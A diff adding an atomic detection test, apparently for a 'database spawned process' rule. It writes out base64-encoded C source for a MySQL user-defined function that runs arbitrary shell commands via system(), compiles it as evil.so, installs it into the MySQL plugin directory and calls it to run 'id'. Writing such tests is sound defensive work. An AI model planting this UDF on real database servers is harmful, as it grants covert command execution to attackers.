@@ -1,0 +1,35 @@
+attack_technique: Test
+display_name: DB program spawned process
+atomic_tests:
+- name: Test
+  description: Test
+  supported_platforms:
+    - linux
+    - containers
+  input_arguments:
+    Temporary Directory:
+      description: Name of the temporary directory used for this test
+      type: String
+      default: tmp_db_dir
+  dependencies:
+    - description: |
+        libmysqlclient-dev and mysql-server installed
+      prereq_command: |
+        which mysqld 1>/dev/null | [ -d "/usr/include/mysql" ]
+      get_prereq_command: |
+        apt-get update && apt -y install libmysqlclient-dev mysql-server
+  executor:
+    command: |
+      mkdir "/tmp/#{Temporary Directory}"; cd "/tmp/#{Temporary Directory}"
+      echo I2luY2x1ZGUgPG15c3FsLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CgpfQm9vbCBleGVjZnVuY19pbml0KFVERl9JTklUICppbml0aWQsIFVERl9BUkdTICphcmdzLCBjaGFyICptZXNzYWdlKQp7CiAgICBpZiAoYXJncy0+YXJnX2NvdW50ICE9IDEgfHwgYXJncy0+YXJnX3R5cGVbMF0gIT0gU1RSSU5HX1JFU1VMVCkKICAgIHsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICAgIHJldHVybiBmYWxzZTsKfQoKdm9pZCBleGVjZnVuY19kZWluaXQoVURGX0lOSVQgKmluaXRpZCBfX2F0dHJpYnV0ZV9fKCh1bnVzZWQpKSkKewogICAgcmV0dXJuIGZhbHNlOwp9CgpjaGFyICpleGVjZnVuYyhVREZfSU5JVCAqaW5pdGlkIF9fYXR0cmlidXRlX18oKHVudXNlZCkpLCBVREZfQVJHUyAqYXJncywgY2hhciAqcmVzdWx0LCB1bnNpZ25lZCBsb25nICpsZW5ndGgsIGNoYXIgKmlzX251bGwsIGNoYXIgKmVycm9yIF9fYXR0cmlidXRlX18oKHVudXNlZCkpKQp7CiAgICByZXN1bHQgPSBjYWxsb2MoNDA5NiwgMSk7CgogICAgc3lzdGVtKGFyZ3MtPmFyZ3NbMF0pOwoKICAgIHN0cmNweShyZXN1bHQsICJFeGVjdXRlZC4iKTsKICAgICpsZW5ndGggPSBzdHJsZW4ocmVzdWx0KTsKCiAgICByZXR1cm4gcmVzdWx0Owp9Cg== | base64 -d > evil.c
+      gcc -Wall -g -O -fPIC -shared evil.c -o evil.so -shared -w -I/usr/include/mysql
+      cp evil.so /usr/lib/mysql/plugin/
+      mysqld & MYSQLD_PID=$!
+      sleep 3
+      mysql -h localhost -P 3306 -e 'DROP FUNCTION IF EXISTS execfunc; CREATE FUNCTION execfunc RETURNS STRING SONAME "evil.so"; SELECT execfunc("id");'
+      kill -9 $MYSQLD_PID && wait $MYSQLD_PID
+    cleanup_command: |
+      rm -r "/tmp/#{Temporary Directory}"
+      apt -y purge mysql-server libmysqlclient-dev
+    name: bash
+    elevation_required: true
